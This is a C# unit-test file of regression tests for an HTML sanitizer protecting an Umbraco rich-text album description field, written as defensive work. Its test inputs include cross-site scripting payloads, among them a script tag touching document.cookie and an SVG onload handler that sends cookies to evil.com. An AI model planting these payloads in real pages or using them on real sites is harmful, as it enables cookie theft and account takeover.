using FluentAssertions;
using Wayfinder.Umbraco.Services.Sanitization;

namespace UmbracoPrism.Core.Tests.Services.Sanitization;

/// <summary>
/// Regression tests for SEC-PT2-008: VinylRecord RTE <c>description</c> field sanitization.
/// <c>VinylRecord.cshtml</c> now routes the Umbraco RTE value through
/// <see cref="ServiceContentSanitizer"/> before passing it to <c>@Html.Raw</c>.
/// These tests prove that a hostile payload authored by a backoffice editor cannot
/// survive that boundary and reach a member's browser.
/// </summary>
public class VinylRecordRteSanitizationTests
{
    private readonly ServiceContentSanitizer _sut = new();

    [Fact]
    public void Sanitize_VinylRecordDescription_ScriptTag_IsStripped()
    {
        // Simulates a backoffice editor injecting a <script> via the RTE.
        const string hostile = "<p>About this album</p><script>document.cookie='stolen'</script>";

        var result = _sut.Sanitize(hostile);

        result.Should().NotContain("<script",
            because: "script tags must be stripped from RTE content before @Html.Raw in VinylRecord.cshtml");
        result.Should().NotContain("document.cookie",
            because: "script payload must not survive sanitization");
        result.Should().Contain("<p>About this album</p>",
            because: "legitimate album description paragraph must pass through intact");
    }

    [Fact]
    public void Sanitize_VinylRecordDescription_OnerrorOnImg_IsStripped()
    {
        // RTE editors can sometimes insert <img> with event handlers via raw HTML mode.
        const string hostile = "<img src=\"x\" onerror=\"alert(document.domain)\">";

        var result = _sut.Sanitize(hostile);

        result.Should().NotContain("onerror",
            because: "onerror attribute on img must be stripped; img is not on the allowlist");
        result.Should().NotContain("<img",
            because: "img tag is not on the GDS allowlist");
    }

    [Fact]
    public void Sanitize_VinylRecordDescription_SvgWithOnload_IsStripped()
    {
        // SVG+onload is a common XSS vector via browser-rendered inline SVG.
        const string hostile = "<svg onload=\"fetch('https://evil.com/?c='+document.cookie)\"><circle/></svg><p>OK</p>";

        var result = _sut.Sanitize(hostile);

        result.Should().NotContain("<svg",
            because: "svg is not on the GDS tag allowlist");
        result.Should().NotContain("onload",
            because: "event handlers must be stripped");
        result.Should().Contain("<p>OK</p>",
            because: "safe sibling paragraph must be preserved");
    }

    [Fact]
    public void Sanitize_VinylRecordDescription_LegitimateRteOutput_PassesThroughIntact()
    {
        // Typical Umbraco TinyMCE output: paragraphs, bold, italic, links, lists.
        const string legitimate =
            "<p>A landmark <strong>jazz</strong> album released in <em>1959</em>.</p>" +
            "<ul><li>Track one</li><li>Track two</li></ul>" +
            "<p>More info at <a href=\"https://example.com\">example.com</a>.</p>";

        var result = _sut.Sanitize(legitimate);

        result.Should().Contain("<p>A landmark <strong>jazz</strong> album")
            .And.Contain("<em>1959</em>")
            .And.Contain("<ul><li>Track one</li><li>Track two</li></ul>")
            .And.Contain("https://example.com");
    }

    [Fact]
    public void Sanitize_VinylRecordDescription_NullOrEmpty_ReturnsEmpty()
    {
        // The VinylRecord view guards with IsNullOrWhiteSpace before rendering,
        // but the sanitizer itself must handle null/empty safely.
        _sut.Sanitize(null).Should().BeEmpty();
        _sut.Sanitize("").Should().BeEmpty();
        _sut.Sanitize("   ").Should().BeEmpty();
    }
}
